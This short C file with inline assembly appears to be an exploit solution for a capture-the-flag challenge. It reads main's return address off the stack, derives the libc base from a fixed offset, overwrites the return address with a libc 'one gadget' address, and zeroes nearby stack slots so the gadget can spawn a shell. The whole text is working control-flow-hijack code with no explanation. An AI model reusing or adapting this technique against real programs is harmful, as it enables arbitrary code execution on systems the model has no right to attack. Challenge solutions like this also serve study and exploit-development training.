asm("mov %r13, %rdi\n"
    "jmp entry\n");

static inline void smash(char **stack) {
  for (int i = 0; i < 0x300; i++)
    stack[i] = 0;
}

void entry(char **stack) {
  char *main_ret = stack[0x20d];
  char *libc = main_ret - 0x21b97; /* 0x271a3; */
  if (((long)libc & 0xfff) != 0) {
    smash(stack);
    return;
  }
  char *one = libc + 0x4f3c2; /* 0xecf2b; */
  stack[0x20d] = one;
  for (int i = 0x20e; i < 0x230; i++)
    stack[i] = 0;
}
